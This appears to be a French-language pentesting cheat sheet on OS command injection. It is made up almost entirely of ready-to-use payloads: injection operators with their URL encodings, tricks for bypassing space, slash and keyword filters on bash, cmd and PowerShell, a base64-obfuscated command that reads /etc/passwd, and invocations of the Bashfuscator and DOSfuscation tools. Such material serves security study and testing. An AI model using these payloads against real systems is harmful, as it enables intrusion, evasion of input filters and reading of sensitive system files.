| New Line   | `\n`   | `%0a`       | Les deux fonctionnent                                   |
| ---------- | ------ | ----------- | ------------------------------------------------------- |
| Background | `&`    | `%26`       | Les deux fonctionnent (second output en premier)        |
| Pipe       | `\|`   | `%7c`       | Les deux fonctionnent (seul le second output s'affiche) |
| AND        | `&&`   | `%26%26`    | Les deux fonctionnent (seulement si le premier réussit) |
| OR         | `\|\|` | `%7c%7c`    | Seul le second s'exécute si le premier échoue           |
| Sub-Shell  | `` ` ` | `%60%60`    | Les deux fonctionnent (uniquement sous Linux)           |
| Sub-Shell  | `$()`  | `%24%28%29` | Les deux fonctionnent (uniquement sous Linux)           |

# Bypass

```
%09	: tabulation
${IFS} : équivaut à un espace
{ls,-la} : bypass espace
${PATH:0:1} : équivaut à /
${LS_COLORS:10:1} : équivaut à ;
' ou " : contourne les restrictions sur les commandes interdites
$@ ou \ : contourne les restrictions sur les commandes interdites
%PROGRAMFILES:~10,-5% : correspond à un espace (cmd)
%HOMEPATH:~0,-17% : correspond à / (cmd)
$env:PROGRAMFILES[10] : correspond à un espace (powershell)
$env:HOMEPATH[0] : correspond à / (powershell)
```

# Obfuscation avec Base64

```
echo -n 'cat /etc/passwd | grep root' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCByb290)
```

# Bashfuscator (Obfuscation Bash)

```bash
./bashfuscator -c 'cat /etc/passwd'
```

# Dosfuscation (Obfuscation Windows CMD)

```powershell
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```